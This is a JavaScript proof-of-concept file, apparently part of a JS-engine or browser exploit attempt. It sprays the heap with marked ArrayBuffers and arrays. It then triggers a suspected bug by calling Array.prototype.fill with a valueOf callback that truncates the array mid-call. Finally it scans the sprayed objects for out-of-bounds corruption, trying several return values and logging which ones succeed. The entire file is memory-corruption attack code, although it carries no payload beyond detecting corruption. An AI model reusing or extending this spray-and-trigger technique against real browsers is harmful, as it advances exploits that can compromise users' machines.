import { log, sleep } from './module/utils.mjs';

const MARK = 0x42424242;

function massiveSpray() {
    const objects = [];
    
    for (let i = 0; i < 1000; i++) {
        const buffer = new ArrayBuffer(0x4000);
        const view = new Uint32Array(buffer);
        view[0] = MARK;
        view[1] = i;
        objects.push(buffer);
    }
    
    for (let i = 0; i < 1000; i++) {
        const arr = new Array(100);
        for (let j = 0; j < arr.length; j++) {
            arr[j] = {
                marker: MARK,
                index: i,
                data: new ArrayBuffer(64)
            };
        }
        objects.push(arr);
    }
    
    for (let i = 0; i < 1000; i++) {
        const typed = new Uint8Array(0x2000);
        typed[0] = 0x42;
        typed[1] = 0x42;
        typed[2] = 0x42;
        typed[3] = 0x42;
        objects.push(typed.buffer);
    }
    
    return objects;
}

function trigger(returnVal) {
    const v0 = [];
    for (let i = 0; i < 50000; i++) {
        v0[i] = {
            tag: 0xdead,
            idx: i,
            buf: new ArrayBuffer(48),
            arr: [1, 2, 3, 4, 5]
        };
    }
    const v10 = new Object(Object, v0);

    function f11() {
        v0.length = 0;
        return returnVal;
    }
    const o14 = { valueOf: f11 };

    try {
        v0.fill(v10, o14);
        log("fill completed");
    } catch (e) {
        log("fill threw:" + e);
    }

    return { v0, v10 };
}

function check(sprayedObjects) {
    let corrupted = 0;
    
    for (let i = 0; i < sprayedObjects.length; i++) {
        const obj = sprayedObjects[i];
        
        if (obj instanceof ArrayBuffer) {
            const view = new Uint32Array(obj);
            if (view[0] !== MARK && view[0] !== 0) {
                log("Buffer corrupted at " + i + " value " + view[0].toString(16));
                corrupted++;
            }
        }
        
        else if (Array.isArray(obj)) {
            for (let j = obj.length; j < obj.length + 20; j++) {
                if (obj[j] !== undefined && obj[j].marker === MARK) {
                    log("Array OOB at " + i + " index " + j);
                    corrupted++;
                }
            }
        }
    }
    
    return corrupted;
}

async function main() {
    const values = [-889, -1000, -100, 0, 100, 1000];
    
    for (const returnValue of values) {
        log("Testing value: " + returnValue);
        
        const sprayedObjects = massiveSpray();
        await sleep(50);
        
        trigger(returnValue);
        await sleep(20);
        
        const corrupted = check(sprayedObjects);
        log("Corrupted: " + corrupted);
        
        if (corrupted > 0) {
            log("SUCCESS with value: " + returnValue);
        }
        
        await sleep(100);
        log("---");
    }
    
    log("done");
}

main();